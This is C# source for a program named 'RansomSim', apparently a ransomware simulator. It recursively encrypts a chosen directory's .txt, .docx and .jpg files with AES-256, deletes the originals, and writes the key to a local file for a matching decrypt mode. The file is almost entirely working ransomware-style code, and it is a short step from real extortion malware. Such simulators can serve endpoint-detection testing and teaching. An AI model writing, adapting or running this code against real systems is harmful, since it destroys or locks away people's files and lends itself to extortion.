
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

class RansomSim
{
    static string keyPath = "aes.key";

    public static void Main(string[] args)
    {
        Console.Write("Enter directory path to process: ");
        string targetDir = Console.ReadLine();

        if (!Directory.Exists(targetDir))
        {
            Console.WriteLine("Directory not found.");
            return;
        }

        if (args.Length > 0 && args[0] == "--decrypt")
        {
            Console.WriteLine("[*] Decrypting files...");
            string key = File.ReadAllText(keyPath);
            foreach (string file in Directory.GetFiles(targetDir, "*", SearchOption.AllDirectories))
            {
                if (file.EndsWith(".enc"))
                {
                    DecryptFile(file, Convert.FromBase64String(key));
                }
            }
        }
        else
        {
            Console.WriteLine("[*] Encrypting files...");
            byte[] key = GenerateKey();
            File.WriteAllText(keyPath, Convert.ToBase64String(key));

            foreach (string file in Directory.GetFiles(targetDir, "*", SearchOption.AllDirectories))
            {
                if (file.EndsWith(".txt") || file.EndsWith(".docx") || file.EndsWith(".jpg"))
                {
                    EncryptFile(file, key);
                }
            }

            Console.WriteLine($"[*] Encryption complete. Key saved to {keyPath}");
        }
    }

    static byte[] GenerateKey()
    {
        using Aes aes = Aes.Create();
        aes.KeySize = 256;
        aes.GenerateKey();
        return aes.Key;
    }

    static void EncryptFile(string filePath, byte[] key)
    {
        byte[] iv;
        byte[] encrypted;

        using Aes aes = Aes.Create();
        aes.Key = key;
        aes.GenerateIV();
        iv = aes.IV;

        using FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read);
        using MemoryStream ms = new MemoryStream();
        using CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write);
        fs.CopyTo(cs);
        cs.FlushFinalBlock();
        encrypted = ms.ToArray();

        File.WriteAllBytes(filePath + ".enc", Combine(iv, encrypted));
        File.Delete(filePath);
        Console.WriteLine($"[+] Encrypted: {filePath}");
    }

    static void DecryptFile(string filePath, byte[] key)
    {
        byte[] data = File.ReadAllBytes(filePath);
        byte[] iv = new byte[16];
        byte[] cipher = new byte[data.Length - 16];

        Array.Copy(data, 0, iv, 0, 16);
        Array.Copy(data, 16, cipher, 0, cipher.Length);

        using Aes aes = Aes.Create();
        aes.Key = key;
        aes.IV = iv;

        using MemoryStream ms = new MemoryStream();
        using CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write);
        cs.Write(cipher, 0, cipher.Length);
        cs.FlushFinalBlock();
        string outputFile = filePath.Replace(".enc", ".decrypted");
        File.WriteAllBytes(outputFile, ms.ToArray());
        File.Delete(filePath);
        Console.WriteLine($"[-] Decrypted: {outputFile}");
    }

    static byte[] Combine(byte[] a, byte[] b)
    {
        byte[] result = new byte[a.Length + b.Length];
        Buffer.BlockCopy(a, 0, result, 0, a.Length);
        Buffer.BlockCopy(b, 0, result, a.Length, b.Length);
        return result;
    }
}